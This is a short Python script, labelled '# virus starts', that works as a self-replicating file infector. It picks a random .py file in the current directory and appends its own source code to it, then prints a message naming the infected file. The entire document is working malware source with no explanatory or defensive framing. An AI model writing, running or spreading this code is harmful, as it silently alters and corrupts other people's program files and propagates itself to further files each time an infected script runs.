# virus starts

import glob
import random

files = glob.glob('*.py')
 
file = random.choice(files)

virus_file = open(__file__, 'r')
virus_source_code = virus_file.read().split('\n# virus starts\n')

if len(virus_source_code) > 1:
 virus_source_code = virus_source_code[1]

else:
 virus_source_code = virus_source_code[0]
 
f = open(file, 'a')
f.write(virus_source_code)
f.close()

print('I have got fungal infection and infected', file)
